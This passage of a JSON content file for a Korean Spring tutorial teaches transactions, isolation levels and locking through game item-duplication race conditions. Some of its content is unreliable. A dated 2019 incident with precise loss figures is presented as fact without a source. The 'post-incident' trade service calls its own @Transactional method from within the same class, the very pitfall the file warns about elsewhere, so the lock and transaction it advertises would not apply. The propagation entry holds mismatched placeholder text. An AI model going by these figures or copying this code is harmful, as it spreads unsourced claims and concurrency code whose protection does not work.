location);\n}\n\n// ═══════════════════════════════════════════════════════════\n// Service - 완벽한 트랜잭션 처리\n// ═══════════════════════════════════════════════════════════\n\n@Service\n@Slf4j\npublic class ItemService {\n    \n    @Autowired\n    private ItemRepository itemRepository;\n    \n    /**\n     * 아이템 창고 이동 - 넥슨 버그 완벽 방어\n     * \n     * 방어 메커니즘:\n     * 1. @Transactional - 원자성 보장\n     * 2. PESSIMISTIC_WRITE - 동시 접근 차단\n     * 3. 사용자별 동기화 - Race Condition 방지\n     */\n    @Transactional(isolation = Isolation.READ_COMMITTED)\n    public void moveItemToStorage(Long userId, Long itemId) {\n        log.info(\"[{}] 아이템 이동 시작 - User: {}, Item: {}\", \n            Thread.currentThread().getName(), userId, itemId);\n        \n        // 1. 비관적 락으로 아이템 조회 (SELECT ... FOR UPDATE)\n        Item item = itemRepository.findInventoryItemWithLock(userId, itemId)\n            .orElseThrow(() -> new ItemNotFoundException(\n                String.format(\"아이템을 찾을 수 없습니다. User: %d, Item: %d\", userId, itemId)));\n        \n        // 이 시점부터 다른 트랜잭션은 이 아이템에 접근 불가!\n        log.info(\"[{}] 아이템 잠금 획득 - Item: {}\", \n            Thread.currentThread().getName(), itemId);\n        \n        // 2. 위치 검증\n        if (!\"INVENTORY\".equals(item.getLocation())) {\n            throw new IllegalStateException(\"인벤토리에 없는 아이템입니다.\");\n        }\n        \n        // 3. 아이템 이동 (단순히 location 변경)\n        item.setLocation(\"STORAGE\");\n        itemRepository.save(item);\n        \n        log.info(\"[{}] 아이템 이동 완료 - Item: {}\", \n            Thread.currentThread().getName(), itemId);\n        \n        // 메서드 종료 시점:\n        // - COMMIT: 변경사항 DB 반영 + 락 해제\n        // - 예외 발생 시: ROLLBACK + 락 해제\n    }\n    \n    /**\n     * 아이템 거래 - 더 복잡한 시나리오\n     * \n     * Seller → Buyer 아이템 이전\n     */\n    @Transactional(isolation = Isolation.SERIALIZABLE)  // 가장 강력한 격리 수준\n    public void tradeItem(Long sellerId, Long buyerId, Long itemId, int price) {\n        log.info(\"거래 시작 - Seller: {}, Buyer: {}, Item: {}, Price: {}\", \n            sellerId, buyerId, itemId, price);\n        \n        // 1. Seller의 아이템 잠금 + 조회\n        Item sellerItem = itemRepository.findInventoryItemWithLock(sellerId, itemId)\n            .orElseThrow(() -> new ItemNotFoundException(\"판매자 아이템 없음\"));\n        \n        // 2. Buyer의 골드 확인 (동시 거래 방지용 잠금)\n        // 실제로는 Gold 엔티티도 비관적 락 필요\n        int buyerGold = getBuyerGoldWithLock(buyerId);\n        if (buyerGold < price) {\n            throw new InsufficientGoldException(\"골드 부족\");\n        }\n        \n        // 3. Seller 골드 증가\n        increaseGold(sellerId, price);\n        \n        // 4. Buyer 골드 차감\n        decreaseGold(buyerId, price);\n        \n        // 5. 아이템 소유권 이전\n        sellerItem.setUserId(buyerId);\n        itemRepository.save(sellerItem);\n        \n        log.info(\"거래 완료 - Item {} transferred from {} to {}\", \n            itemId, sellerId, buyerId);\n        \n        // COMMIT:\n        // - Seller 골드 +price\n        // - Buyer 골드 -price\n        // - Item 소유자 변경\n        // 하나라도 실패 시 전체 ROLLBACK!\n    }\n    \n    /**\n     * 중복 클릭 방지: Idempotent Key 패턴\n     */\n    @Transactional\n    public void moveItemWithIdempotency(Long userId, Long itemId, String requestId) {\n        // 1. 요청 ID 중복 체크 (Redis 추천)\n        if (isDuplicateRequest(requestId)) {\n            log.warn(\"중복 요청 감지 - RequestId: {}\", requestId);\n            return;  // 중복 요청 무시\n        }\n        \n        // 2. 요청 ID 저장 (TTL 30초)\n        saveRequestId(requestId, 30);\n        \n        // 3. 아이템 이동 처리\n        moveItemToStorage(userId, itemId);\n    }\n    \n    private boolean isDuplicateRequest(String requestId) {\n        // Redis: EXISTS request_id\n        return false;  // 구현 생략\n    }\n    \n    private void saveRequestId(String requestId, int ttlSeconds) {\n        // Redis: SET request_id 1 EX 30\n    }\n    \n    private int getBuyerGoldWithLock(Long buyerId) {\n        // UserRepository.findByIdWithLock(buyerId).getGold()\n        return 1000000;  // 예시\n    }\n    \n    private void increaseGold(Long userId, int amount) {\n        // UPDATE users SET gold = gold + amount WHERE id = userId\n    }\n    \n    private void decreaseGold(Long userId, int amount) {\n        // UPDATE users SET gold = gold - amount WHERE id = userId\n    }\n}\n\n// ═══════════════════════════════════════════════════════════\n// Controller - API 레벨 중복 방지\n// ═══════════════════════════════════════════════════════════\n\n@RestController\n@RequestMapping(\"/api/items\")\npublic class ItemController {\n    \n    @Autowired\n    private ItemService itemService;\n    \n    @PostMapping(\"/{itemId}/move-to-storage\")\n    public ResponseEntity<String> moveToStorage(\n        @PathVariable Long itemId,\n        @RequestHeader(\"X-Request-ID\") String requestId,  // 클라이언트가 생성한 고유 ID\n        @AuthenticationPrincipal CustomUserDetails user\n    ) {\n        try {\n            itemService.moveItemWithIdempotency(user.getUserId(), itemId, requestId);\n            return ResponseEntity.ok(\"아이템이 창고로 이동되었습니다.\");\n        } catch (ItemNotFoundException e) {\n            return ResponseEntity.status(HttpStatus.NOT_FOUND).body(e.getMessage());\n        } catch (Exception e) {\n            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)\n                .body(\"아이템 이동 실패\");\n        }\n    }\n}\n\n// ═══════════════════════════════════════════════════════════\n// 프론트엔드 (React/Vue) - 중복 클릭 방지\n// ═══════════════════════════════════════════════════════════\n\n/*\nfunction moveItemToStorage(itemId) {\n    const requestId = uuidv4();  // 고유 ID 생성\n    \n    // 버튼 비활성화\n    setLoading(true);\n    \n    axios.post(`/api/items/${itemId}/move-to-storage`, null, {\n        headers: {\n            'X-Request-ID': requestId  // 요청 ID 전송\n        }\n    })\n    .then(response => {\n        alert('아이템이 창고로 이동되었습니다.');\n    })\n    .catch(error => {\n        alert('오류 발생');\n    })\n    .finally(() => {\n        setLoading(false);  // 버튼 활성화\n    });\n}\n*/\n\n// ═══════════════════════════════════════════════════════════\n// 테스트 - 동시성 검증\n// ═══════════════════════════════════════════════════════════\n\n@SpringBootTest\nclass ItemServiceConcurrencyTest {\n    \n    @Autowired\n    private ItemService itemService;\n    \n    @Test\n    void 동시_아이템_이동_테스트() throws InterruptedException {\n        // Given: 아이템 1개 존재\n        Long userId = 1L;\n        Long itemId = 100L;\n        \n        // When: 10개 스레드가 동시에 같은 아이템 이동 시도\n        ExecutorService executor = Executors.newFixedThreadPool(10);\n        CountDownLatch latch = new CountDownLatch(10);\n        \n        AtomicInteger successCount = new AtomicInteger(0);\n        AtomicInteger failCount = new AtomicInteger(0);\n        \n        for (int i = 0; i < 10; i++) {\n            executor.submit(() -> {\n                try {\n                    itemService.moveItemToStorage(userId, itemId);\n                    successCount.incrementAndGet();\n                } catch (Exception e) {\n                    failCount.incrementAndGet();\n                } finally {\n                    latch.countDown();\n                }\n            });\n        }\n        \n        latch.await();\n        executor.shutdown();\n        \n        // Then: 1번만 성공, 나머지 실패\n        assertEquals(1, successCount.get());\n        assertEquals(9, failCount.get());\n        \n        System.out.println(\"성공: \" + successCount.get());\n        System.out.println(\"실패: \" + failCount.get());\n    }\n}"
      },
      {
        "type": "quiz",
        "title": "💼 면접 필수 질문",
        "questions": [
          {
            "question": "넥슨 아이템 복사 버그는 왜 발생했나요? @Transactional이 있었다면 어떻게 방지할 수 있었나요?",
            "answer": "**원인**: 트랜잭션과 락(Lock) 부재로 Race Condition 발생\n\n```java\n// ❌ 문제 코드\npublic void moveItem(Long itemId) {\n    Item item = repository.findById(itemId);  // 1번 요청: 조회 성공\n    repository.delete(item);  // 1번 요청: 삭제 시작\n    \n    // 이 순간 2번 요청이 findById() 실행!\n    // → 아직 삭제 완료 안 됨 → 조회 성공!\n    \n    storage.save(item);  // 1번 요청: 저장\n    // 2번 요청도 delete() + save() 성공 → 복사됨!\n}\n```\n\n**@Transactional로 방어**:\n\n```java\n// ✅ 해결\n@Transactional(isolation = Isolation.READ_COMMITTED)\npublic void moveItem(Long itemId) {\n    Item item = repository.findByIdWithLock(itemId);  // SELECT ... FOR UPDATE\n    repository.delete(item);\n    storage.save(item);\n    // COMMIT 전까지 다른 트랜잭션은 이 item에 접근 불가!\n}\n```\n\n**효과**:\n- **원자성**: delete와 save가 하나의 단위 → 중간 실패 시 전체 롤백\n- **격리성**: 첫 번째 트랜잭션 완료까지 두 번째 대기\n- **일관성**: 총 아이템 개수 보존"
          },
          {
            "question": "트랜잭션 전파(Propagation) 옵션 중 REQUIRED와 REQUIRES_NEW의 차이는?",
            "answer": "**REQUIRED (기본값)**:\n- 부모 트랜잭션이 있으면 참여, 없으면 새로 생성\n- 가장 일반적인 사용\n\n```java\n@Transactional  // 부모 트랜잭션\npublic void processOrder(Order order) {\n    paymentService.charge(order);     // REQUIRED (같은 트랜잭션)\n    inventoryService.decrease(order); // REQUIRED (같은 트랜잭션)\n    \n    // 하나라도 실패 → 전체 롤백\n}\n```\n\n**REQUIRES_NEW**:\n- 항상 새 트랜잭션 생성\n- 부모 트랜잭션 일시 중단\n- 독립적인 커밋/롤백\n\n```java\n@Transactional\npublic void processOrder(Order order) {\n    paymentService.charge(order);  // 부모 트랜잭션\n    auditService.log(order);       // REQUIRES_NEW (별도 트랜잭션)\n    \n    // audit 실패해도 payment는 커밋됨!\n}\n\n@Service\nclass AuditService {\n    @Transactional(propagation = Propagation.REQUIRES_NEW)\n    public void log(Order order) {\n        // 독립적인 트랜잭션\n    }\n}\n```\n\n**사용 사례**:\n- REQUIRED: 일반적인 비즈니스 로직\n- REQUIRES_NEW: 로그 저장 (메인 로직 실패해도 로그는 남겨야 함)"
          },
          {
            "question": "@Transactional을 사용할 때 주의사항 3가지는?",
            "answer": "**1. private 메서드에는 적용 안 됨**\n\n```java\n// ❌ 작동 안 함!\n@Transactional\nprivate void updateUser(User user) {  // AOP 프록시 생성 불가\n    userRepository.save(user);\n}\n\n// ✅ public으로 변경\n@Transactional\npublic void updateUser(User user) {\n    userRepository.save(user);\n}\n```\n\n**2. 같은 클래스 내부 호출 시 적용 안 됨**\n\n```java\n@Service\nclass UserService {\n    public void register(User user) {\n        validateUser(user);  // ❌ 프록시 거치지 않음\n    }\n    \n    @Transactional\n    private void validateUser(User user) {\n        // 트랜잭션 적용 안 됨!\n    }\n}\n\n// ✅ 다른 Bean에서 호출해야 함\n@Service\nclass UserService {\n    @Autowired\n    private ValidationService validationService;\n    \n    public void register(User user) {\n        validationService.validate(user);  // ✅ 프록시 거침\n    }\n}\n```\n\n**3. 예외 타입 주의 (RuntimeException만 롤백)**\n\n```java\n@Transactional\npublic void saveUser(User user) throws Exception {\n    userRepository.save(user);\n    \n    if (user.getAge() < 0) {\n        throw new Exception(\"나이 오류\");  // ❌ 롤백 안 됨! (Checked Exception)\n    }\n}\n\n// ✅ RuntimeException 사용\n@Transactional\npublic void saveUser(User user) {\n    userRepository.save(user);\n    \n    if (user.getAge() < 0) {\n        throw new IllegalArgumentException(\"나이 오류\");  // ✅ 롤백됨!\n    }\n}\n\n// 또는 rollbackFor 명시\n@Transactional(rollbackFor = Exception.class)\npublic void saveUser(User user) throws Exception {\n    // 모든 예외에 대해 롤백\n}\n```"
          },
          {
            "question": "조회(SELECT)만 하는 메서드에도 @Transactional을 붙여야 하나요?",
            "answer": "**상황에 따라 다릅니다.**\n\n**✅ 붙이는 게 좋은 경우**:\n\n```java\n// 1. 여러 테이블 조회 시 일관성 필요\n@Transactional(readOnly = true)\npublic OrderSummary getOrderSummary(Long orderId) {\n    Order order = orderRepository.findById(orderId);\n    List<Item> items = itemRepository.findByOrderId(orderId);\n    Payment payment = paymentRepository.findByOrderId(orderId);\n    \n    // 조회 중간에 다른 트랜잭션이 데이터 수정 → 일관성 깨짐 방지\n    return new OrderSummary(order, items, payment);\n}\n\n// 2. 지연 로딩(Lazy Loading) 사용 시\n@Transactional(readOnly = true)\npublic User getUserWithOrders(Long userId) {\n    User user = userRepository.findById(userId);\n    user.getOrders().size();  // Lazy Loading\n    // @Transactional 없으면 LazyInitializationException!\n    return user;\n}\n```\n\n**readOnly = true 효과**:\n- 성능 최적화 (플러시 생략)\n- DB 힌트 전달 (읽기 전용)\n- 의도 명확화\n\n**❌ 불필요한 경우**:\n\n```java\n// 단순 단일 조회\npublic User getUser(Long id) {\n    return userRepository.findById(id).orElseThrow();\n    // @Transactional 없어도 됨 (Repository가 자동으로 트랜잭션 처리)\n}\n```\n\n**원칙**: **여러 테이블 조회 or Lazy Loading → @Transactional(readOnly = true)**"
          }
        ]
      },
      {
        "type": "concept",
        "title": "🎯 생존 체크리스트",
        "content": "## ✅ 당신의 코드는 안전한가?\n\n### 🔍 트랜잭션 필수 체크\n\n```bash\n# 1. 돈/포인트 관련 코드 검색\ngrep -r \"payment\\|charge\\|금액\\|포인트\" src/\n# → @Transactional 없으면 즉시 추가!\n\n# 2. 재고/수량 변경 코드 검색\ngrep -r \"quantity\\|stock\\|재고\" src/\n# → Race Condition 가능성 → 비관적 락 고려\n\n# 3. 여러 테이블 동시 수정\ngrep -r \"save.*save\\|update.*update\" src/\n# → @Transactional 필수!\n```\n\n### 📊 위험도 평가\n\n| 상황 | 위험도 | 조치 |\n|------|--------|------|\n| 결제 처리에 @Transactional 없음 | 🔴 **치명적** | 즉시 추가 + 테스트 |\n| 재고 차감에 락 없음 | 🔴 **치명적** | 비관적 락 적용 |\n| 조회 전용에 @Transactional | 🟡 **낮음** | readOnly=true 권장 |\n| private 메서드에 @Transactional | 🟠 **높음** | public으로 변경 |\n\n### 🛡️ 즉시 적용 패턴\n\n**1. 기본 트랜잭션**\n```java\n@Transactional\npublic void processPayment(Payment payment) {\n    // 여러 단계의 작업\n}\n```\n\n**2. 읽기 전용 (성능 최적화)**\n```java\n@Transactional(readOnly = true)\npublic List<Order> getOrders(Long userId) {\n    return orderRepository.findByUserId(userId);\n}\n```\n\n**3. 동시성 제어 필수 (아이템, 재고)**\n```java\n@Transactional(isolation = Isolation.READ_COMMITTED)\npublic void decreaseStock(Long productId, int quantity) {\n    Product product = productRepository.findByIdWithLock(productId);\n    product.decreaseStock(quantity);\n}\n```\n\n**4. 독립적인 로그 저장**\n```java\n@Transactional(propagation = Propagation.REQUIRES_NEW)\npublic void saveAuditLog(AuditLog log) {\n    auditRepository.save(log);\n}\n```\n\n### ⚠️ 경고 신호\n\n```java\n// 🚨 이런 코드가 보이면 즉시 수정\n\npublic void transferMoney(Account from, Account to, int amount) {\n    from.withdraw(amount);  // ❌ @Transactional 없음!\n    to.deposit(amount);     // 중간에 에러 나면?\n}\n\npublic void buyItem(Long userId, Long itemId) {\n    decreaseStock(itemId);  // ❌ 동시성 제어 없음!\n    chargeUser(userId);     // 여러 명이 동시 구매하면?\n}\n```\n\n---\n\n## 💀 마지막 경고\n\n```\n┌──────────────────────────────────────────────────────┐\n│  \"돈이 오가는 곳에 @Transactional이 없다면,          │\n│   당신은 차기 넥슨 아이템 복사 버그의 주인공이다.\"  │\n│                                                      │\n│  - 트랜잭션 없음 = 데이터 복사/증발                 │\n│  - 락 없음 = Race Condition = 게임 경제 붕괴        │\n│  - 한 줄의 @Transactional = 회사 생존               │\n└──────────────────────────────────────────────────────┘\n```\n\n**지금 당장 코드를 점검하세요. 유저는 이미 버그를 찾고 있습니다.**"
      }
    ]
  },
  "08_트랜잭션/transaction-isolation": {
    "id": "08_트랜잭션/transaction-isolation",
    "title": "트랜잭션 격리 수준 - 게임사 아이템 복제 버그로 서비스 중단",
    "category": "spring",
    "subCategory": "08_트랜잭션",
    "language": "Java",
    "description": "실제 게임사 아이템 복제 해킹 사례로 배우는 트랜잭션 격리 수준과 동시성 제어. @Transactional의 isolation 옵션을 왜 설정해야 하는지 이해합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "🚨 실제 사고: 게임사 아이템 복제 버그로 100억 원 손실 (2019년 N사)",
        "content": "**[The Incident - 실제로 일어난 일]**\n\n2019년, 유명 MMORPG 게임에서 아이템 복제 버그가 발생했습니다.\n\n**문제의 코드:**\n\n```java\n@Service\npublic class ItemTradeService {\n    \n    @Transactional  // 기본 격리 수준: READ_COMMITTED\n    public void tradeItem(Long sellerId, Long buyerId, Long itemId) {\n        // 1. 아이템 조회\n        Item item = itemRepository.findById(itemId);  // 시점 A\n        \n        // 2. 판매자 확인\n        if (!item.getOwnerId().equals(sellerId)) {\n            throw new IllegalStateException(\"본인 아이템만 거래 가능\");\n        }\n        \n        // 3. 아이템 소유권 이전\n        item.setOwnerId(buyerId);  // 시점 B\n        itemRepository.save(item);\n        \n        // 4. 대금 지급\n        goldService.transfer(buyerId, sellerId, item.getPrice());\n    }\n}\n```\n\n**해커의 공격 (동시성 취약점 악용):**\n\n```\n[시간]     [트랜잭션 1]              [트랜잭션 2]\n────────────────────────────────────────────────\nT1        아이템 조회 (소유자: A)    \nT2                                  아이템 조회 (소유자: A)\nT3        소유권 → B로 변경          \nT4        커밋 완료                  \nT5                                  소유권 → C로 변경 \nT6                                  커밋 완료\n\n결과: 아이템이 B와 C 두 명에게 복제됨!\n       A는 대금을 2번 받음 (골드 복제)\n```\n\n---\n\n**[The Disaster - 피해 규모]**\n\n| 항목 | 피해 |\n|------|------|\n| 복제된 아이템 | 150만 개 |\n| 복제된 게임머니 | 약 100억 원 상당 |\n| 서비스 중단 | 48시간 긴급 점검 |\n| 롤백 작업 | 1주일치 데이터 |\n| 유저 이탈 | MAU 30% 감소 |\n\n**핵심 문제:**\n> \"READ_COMMITTED는 다른 트랜잭션의 커밋된 데이터를 읽지만,\n> 같은 데이터를 두 번 읽을 때 값이 달라질 수 있다 (Non-Repeatable Read)\""
      },
      {
        "type": "concept",
        "title": "📚 트랜잭션 격리 수준 완벽 이해",
        "content": "**격리 수준이란?**\n\n여러 트랜잭션이 동시에 실행될 때, 서로의 작업을 얼마나 \"볼 수 있는지\" 정의합니다.\n\n---\n\n**4가지 격리 수준 비교:**\n\n| 격리 수준 | Dirty Read | Non-Repeatable Read | Phantom Read | 성능 |\n|-----------|------------|---------------------|--------------|------|\n| READ_UNCOMMITTED | O | O | O | 최고 |\n| READ_COMMITTED | X | O | O | 높음 |\n| REPEATABLE_READ | X | X | O | 보통 |\n| SERIALIZABLE | X | X | X | 낮음 |\n\n---\n\n**각 문제 상황 설명:**\n\n**1. Dirty Read (더티 리드)**\n```\n트랜잭션 A: UPDATE 계좌 SET 잔액 = 0  (아직 커밋 안 함)\n트랜잭션 B: SELECT 잔액 → 0원으로 읽음\n트랜잭션 A: ROLLBACK (롤백!)\n\n결과: B는 존재하지 않는 0원을 기준으로 처리함\n```\n\n**2. Non-Repeatable Read (반복 불가 읽기)** ← 아이템 복제 원인!\n```\n트랜잭션 A: SELECT 잔액 → 1000원\n트랜잭션 B: UPDATE 잔액 = 500, COMMIT\n트랜잭션 A: SELECT 잔액 → 500원 (값이 바뀜!)\n\n결과: 같은 쿼리인데 결과가 다름\n```\n\n**3. Phantom Read (팬텀 리드)**\n```\n트랜잭션 A: SELECT * WHERE 레벨 > 10 → 5명\n트랜잭션 B: INSERT 레벨 15 유저, COMMIT\n트랜잭션 A: SELECT * WHERE 레벨 > 10 → 6명 (유령처럼 등장)\n\n결과: 없던 행이 갑자기 나타남\n```"
      },
      {
        "type": "code",
        "language": "java",
        "title": "🛡️ 생존 키트: 올바른 트랜잭션 격리 설정",
        "code": "// ═══════════════════════════════════════════════════════════════\n// ❌ 위험: 기본 격리 수준 (동시성 공격에 취약)\n// ═══════════════════════════════════════════════════════════════\n\n@Service\npublic class UnsafeItemService {\n    \n    @Transactional  // 기본값: READ_COMMITTED\n    public void tradeItem(Long sellerId, Long buyerId, Long itemId) {\n        Item item = itemRepository.findById(itemId).orElseThrow();\n        // 다른 트랜잭션이 동시에 같은 아이템 거래 가능!\n        item.setOwnerId(buyerId);\n        itemRepository.save(item);\n    }\n}\n\n// ═══════════════════════════════════════════════════════════════\n// ✅ 안전: SERIALIZABLE + 비관적 락 조합\n// ═══════════════════════════════════════════════════════════════\n\n@Service\n@RequiredArgsConstructor\npublic class SecureItemService {\n    \n    private final ItemRepository itemRepository;\n    private final GoldService goldService;\n    \n    @Transactional(isolation = Isolation.SERIALIZABLE)\n    public void tradeItem(Long sellerId, Long buyerId, Long itemId) {\n        \n        // 1. 비관적 락으로 아이템 조회 (다른 트랜잭션 대기)\n        Item item = itemRepository.findByIdWithLock(itemId)\n            .orElseThrow(() -> new ItemNotFoundException(itemId));\n        \n        // 2. 소유권 검증\n        if (!item.getOwnerId().equals(sellerId)) {\n            throw new UnauthorizedTradeException(\"본인 아이템만 거래 가능\");\n        }\n        \n        // 3. 이미 거래 중인지 확인 (상태 검증)\n        if (item.getStatus() == ItemStatus.TRADING) {\n            throw new ItemAlreadyTradingException(itemId);\n        }\n        \n        // 4. 거래 상태로 변경\n        item.setStatus(ItemStatus.TRADING);\n        \n        // 5. 소유권 이전\n        item.setOwnerId(buyerId);\n        item.setStatus(ItemStatus.NORMAL);\n        \n        // 6. 대금 지급\n        goldService.transfer(buyerId, sellerId, item.getPrice());\n        \n        itemRepository.save(item);\n    }\n}\n\n// ═══════════════════════════════════════════════════════════════\n// 🔒 Repository: 비관적 락 쿼리\n// ═══════════════════════════════════════════════════════════════\n\n@Repository\npublic interface ItemRepository extends JpaRepository<Item, Long> {\n    \n    // 비관적 쓰기 락: 다른 트랜잭션이 이 행을 읽거나 쓰지 못함\n    @Lock(LockModeType.PESSIMISTIC_WRITE)\n    @Query(\"SELECT i FROM Item i WHERE i.id = :id\")\n    Optional<Item> findByIdWithLock(@Param(\"id\") Long id);\n    \n    // 비관적 읽기 락: 다른 트랜잭션이 쓰지 못함 (읽기는 가능)\n    @Lock(LockModeType.PESSIMISTIC_READ)\n    @Query(\"SELECT i FROM Item i WHERE i.id = :id\")\n    Optional<Item> findByIdWithSharedLock(@Param(\"id\") Long id);\n}\n\n// ═══════════════════════════════════════════════════════════════\n// 🏆 실전 베스트 프랙티스: 낙관적 락 + 재시도\n// ═══════════════════════════════════════════════════════════════\n\n@Entity\npublic class Item {\n    \n    @Id\n    private Long id;\n    \n    @Version  // 낙관적 락 버전 관리\n    private Long version;\n    \n    private Long ownerId;\n    private Long price;\n}\n\n@Service\n@RequiredArgsConstructor\npublic class OptimisticItemService {\n    \n    @Retryable(\n        value = OptimisticLockingFailureException.class,\n        maxAttempts = 3,\n        backoff = @Backoff(delay = 100)\n    )\n    @Transactional\n    public void tradeItem(Long sellerId, Long buyerId, Long itemId) {\n        Item item = itemRepository.findById(itemId).orElseThrow();\n        \n        // @Version 필드가 자동으로 충돌 감지\n        // 다른 트랜잭션이 먼저 수정하면 OptimisticLockingFailureException 발생\n        // → @Retryable이 자동 재시도\n        \n        item.setOwnerId(buyerId);\n        itemRepository.save(item);  // version 불일치 시 예외 발생\n    }\n}"
      },
      {
        "type": "concept",
        "title": "⚔️ 비관적 락 vs 낙관적 락: 언제 뭘 써야 하나?",
        "content": "**비관적 락 (Pessimistic Lock)**\n\n```\n\"충돌이 발생할 것이라고 가정하고, 미리 잠근다\"\n\n[사용 시나리오]\n• 동시 수정이 자주 발생하는 경우\n• 충돌 시 롤백 비용이 큰 경우 (결제, 송금)\n• 데이터 정합성이 매우 중요한 경우\n\n[단점]\n• 대기 시간 증가 (다른 트랜잭션이 기다림)\n• 데드락 위험\n• 성능 저하 가능\n```\n\n---\n\n**낙관적 락 (Optimistic Lock)**\n\n```\n\"충돌이 발생하지 않을 것이라고 가정하고, 커밋 시점에 검증\"\n\n[사용 시나리오]\n• 동시 수정이 드문 경우\n• 읽기가 많고 쓰기가 적은 경우\n• 재시도가 가능한 경우\n\n[단점]\n• 충돌 시 재시도 필요\n• 버전 관리 필드 필요 (@Version)\n```\n\n---\n\n**실전 선택 가이드:**\n\n| 상황 | 권장 방식 |\n|------|----------|\n| 결제/송금/재고 차감 | 비관적 락 + SERIALIZABLE |\n| 게시글 수정 | 낙관적 락 + 재시도 |\n| 좋아요/조회수 | 낙관적 락 또는 별도 카운터 |\n| 아이템 거래 | 비관적 락 (게임사 사고 교훈) |\n| 예약 시스템 | 비관적 락 + 상태 머신 |"
      },
      {
        "type": "code",
        "language": "java",
        "title": "🎮 게임사 실전 코드: 아이템 거래 시스템",
        "code": "// ═══════════════════════════════════════════════════════════════\n// 실제 게임사에서 사용하는 아이템 거래 시스템 (사고 후 개선 버전)\n// ═══════════════════════════════════════════════════════════════\n\n@Service\n@RequiredArgsConstructor\n@Slf4j\npublic class GameItemTradeService {\n    \n    private final ItemRepository itemRepository;\n    private final UserRepository userRepository;\n    private final TradeLogRepository tradeLogRepository;\n    private final RedissonClient redisson;  // 분산 락\n    \n    public void tradeItem(TradeRequest request) {\n        String lockKey = \"trade:item:\" + request.getItemId();\n        RLock lock = redisson.getLock(lockKey);\n        \n        try {\n            // 1. 분산 락 획득 (최대 10초 대기, 30초 유지)\n            boolean acquired = lock.tryLock(10, 30, TimeUnit.SECONDS);\n            if (!acquired) {\n                throw new TradeFailedException(\"다른 거래가 진행 중입니다\");\n            }\n            \n            // 2. 실제 거래 로직 (트랜잭션 내부)\n            executeTradeInTransaction(request);\n            \n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new TradeFailedException(\"거래가 중단되었습니다\");\n        } finally {\n            // 3. 락 해제\n            if (lock.isHeldByCurrentThread()) {\n                lock.unlock();\n            }\n        }\n    }\n    \n    @Transactional(isolation = Isolation.SERIALIZABLE)\n    protected void executeTradeInTransaction(TradeRequest request) {\n        \n        // 4. 비관적 락으로 아이템 조회\n        Item item = itemRepository.findByIdWithLock(request.getItemId())\n            .orElseThrow(() -> new ItemNotFoundException(request.getItemId()));\n        \n        // 5. 상태 검증 (상태 머신)\n        if (item.getStatus() != ItemStatus.TRADEABLE) {\n            throw new ItemNotTradeableException(\n                \"현재 거래할 수 없는 상태입니다: \" + item.getStatus()\n            );\n        }\n        \n        // 6. 소유권 검증\n        if (!item.getOwnerId().equals(request.getSellerId())) {\n            log.warn(\"소유권 불일치 시도: itemId={}, claimed={}, actual={}\",\n                item.getId(), request.getSellerId(), item.getOwnerId());\n            throw new UnauthorizedTradeException(\"본인 아이템이 아닙니다\");\n        }\n        \n        // 7. 구매자 골드 확인\n        User buyer = userRepository.findByIdWithLock(request.getBuyerId())\n            .orElseThrow(() -> new UserNotFoundException(request.getBuyerId()));\n        \n        if (buyer.getGold() < item.getPrice()) {\n            throw new InsufficientGoldException(\n                \"골드 부족: 필요=\" + item.getPrice() + \", 보유=\" + buyer.getGold()\n            );\n        }\n        \n        // 8. 거래 실행\n        User seller = userRepository.findById(request.getSellerId()).orElseThrow();\n        \n        buyer.setGold(buyer.getGold() - item.getPrice());\n        seller.setGold(seller.getGold() + item.getPrice());\n        item.setOwnerId(request.getBuyerId());\n        \n        // 9. 감사 로그 기록\n        TradeLog tradeLog = TradeLog.builder()\n            .itemId(item.getId())\n            .sellerId(seller.getId())\n            .buyerId(buyer.getId())\n            .price(item.getPrice())\n            .tradedAt(LocalDateTime.now())\n            .sellerGoldBefore(seller.getGold() - item.getPrice())\n            .buyerGoldBefore(buyer.getGold() + item.getPrice())\n            .build();\n        \n        tradeLogRepository.save(tradeLog);\n        \n        log.info(\"거래 완료: {} -> {}, item={}, price={}\",\n            seller.getId(), buyer.getId(), item.getId(), item.getPrice());\n    }\n}"
      },
      {
        "type": "tip",
        "title": "💼 면접 대비: 트랜잭션 관련 질문",
        "content": "**Q: \"트랜잭션 격리 수준 4가지를 설명하고, 각각 언제 사용하나요?\"**\n\n✅ 모범 답안:\n\"READ_UNCOMMITTED는 커밋되지 않은 데이터를 읽을 수 있어 거의 사용하지 않습니다. READ_COMMITTED는 커밋된 데이터만 읽어 일반적인 CRUD에 사용합니다. REPEATABLE_READ는 같은 데이터를 반복 조회해도 일관된 결과를 보장해 집계 쿼리에 적합합니다. SERIALIZABLE은 완전한 격리를 보장하지만 성능 저하가 있어 금융 거래나 재고 관리 같은 중요 작업에만 사용합니다.\"\n\n---\n\n**Q: \"게임에서 아이템 복제 버그는 왜 발생하고 어떻게 막나요?\"**\n\n✅ 모범 답안:\n\"아이템 복제 버그는 주로 동시성 제어 미흡으로 발생합니다. 두 트랜잭션이 동시에 같은 아이템을 조회하고 수정할 때, 격리 수준이 낮으면 둘 다 성공합니다. 이를 막으려면 비관적 락이나 낙관적 락을 사용해야 합니다. 저는 비관적 락으로 조회 시점에 행을 잠그고, 분산 환경에서는 Redis 기반 분산 락을 추가로 적용합니다. 또한 아이템 상태를 TRADING으로 변경해 중복 거래를 원천 차단합니다.\"\n\n---\n\n**Q: \"비관적 락과 낙관적 락의 차이점과 선택 기준은?\"**\n\n✅ 모범 답안:\n\"비관적 락은 충돌을 가정하고 미리 잠그므로 대기 시간이 발생하지만 충돌을 원천 차단합니다. 결제나 재고처럼 롤백 비용이 큰 경우에 적합합니다. 낙관적 락은 충돌이 드물다고 가정하고 커밋 시점에 버전을 비교하므로 대기가 없어 성능이 좋지만, 충돌 시 재시도가 필요합니다. 게시글 수정처럼 충돌이 드문 경우에 적합합니다. 게임 아이템 거래처럼 동시 요청이 많고 정합성이 중요한 경우는 비관적 락을 선택합니다.\""
      }
    ]
  },
  "08_트랜잭션/transaction-propagation": {
    "id": "08_트랜잭션/transaction-propagation",
    "title": "Transaction Propagation",
    "category": "spring",
    "subCategory": "08_트랜잭션",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Transaction Propagation",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "08_트랜잭션/transaction-readonly": {
    "id": "08_트랜잭션/transaction-readonly",
